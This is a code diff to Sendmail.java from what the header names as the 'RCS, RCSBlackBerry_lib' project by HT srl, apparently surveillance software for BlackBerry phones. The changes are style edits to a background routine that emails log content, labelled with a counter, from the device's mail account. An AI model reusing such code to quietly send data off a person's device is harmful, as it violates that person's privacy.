@@ -1,3 +1,12 @@
+//#preprocess
+/* *************************************************
+ * Copyright (c) 2010 - 2010
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Sendmail.java
+ * Created      : 26-mar-2010
+ * *************************************************/
+
 package blackberry.utils;
 
 import net.rim.blackberry.api.mail.Address;
@@ -22,32 +31,33 @@ public class Sendmail implements Runnable {
     int counter;
     String content;
 
-    public Sendmail(String to, int counter, String content) {
+    public Sendmail(final String to, final int counter, final String content) {
         this.to = to;
         this.counter = counter;
         this.content = content;
     }
 
-    public static void send(String to, int counter, String content) {
+    public static void send(final String to, final int counter,
+            final String content) {
         //#ifdef DEBUG_TRACE
         debug.trace("send: " + counter);
         //#endif
-        Sendmail sendmail = new Sendmail(to, counter, content);
-        Thread thread = new Thread(sendmail);
+        final Sendmail sendmail = new Sendmail(to, counter, content);
+        final Thread thread = new Thread(sendmail);
         thread.start();
     }
 
-    public void run() {
-        Store st = Session.getDefaultInstance().getStore();
-        Folder[] folders = st.list(Folder.SENT);
-        Folder sentFolder = folders[0];
+    public final void run() {
+        final Store st = Session.getDefaultInstance().getStore();
+        final Folder[] folders = st.list(Folder.SENT);
+        final Folder sentFolder = folders[0];
 
-        Message msg = new Message(sentFolder);
+        final Message msg = new Message(sentFolder);
 
-        Address toList[] = new Address[1];
+        final Address[] toList = new Address[1];
         try {
             toList[0] = new Address(to, to);
-        } catch (AddressException ex) {
+        } catch (final AddressException ex) {
             //#ifdef DEBUG_ERROR
             debug.error("send: " + ex);
             //#endif
@@ -55,16 +65,16 @@ public class Sendmail implements Runnable {
 
         try {
             msg.addRecipients(Message.RecipientType.TO, toList); //  add To, CC, BCC
-        } catch (MessagingException ex) {
+        } catch (final MessagingException ex) {
             //#ifdef DEBUG_ERROR
             debug.error("send: " + ex);
             //#endif
         }
 
         try {
-            Address addressFrom = new Address(from, from); // Sender Details
+            final Address addressFrom = new Address(from, from); // Sender Details
             msg.setFrom(addressFrom);
-        } catch (AddressException ex) {
+        } catch (final AddressException ex) {
             //#ifdef DEBUG_ERROR
             debug.error("send: " + ex);
             //#endif
@@ -73,7 +83,7 @@ public class Sendmail implements Runnable {
         msg.setSubject(LOGSUBJECT + " " + counter); //  For Subject
         try {
             msg.setContent(content);
-        } catch (MessagingException ex) {
+        } catch (final MessagingException ex) {
             //#ifdef DEBUG_ERROR
             debug.error("send: " + ex);
             //#endif
@@ -82,7 +92,7 @@ public class Sendmail implements Runnable {
         try {
             Transport.send(msg);
             System.out.println(" Email Sent successfully.");
-        } catch (MessagingException ex) {
+        } catch (final MessagingException ex) {
             //#ifdef DEBUG_ERROR
             debug.error("send: " + ex);
             //#endif
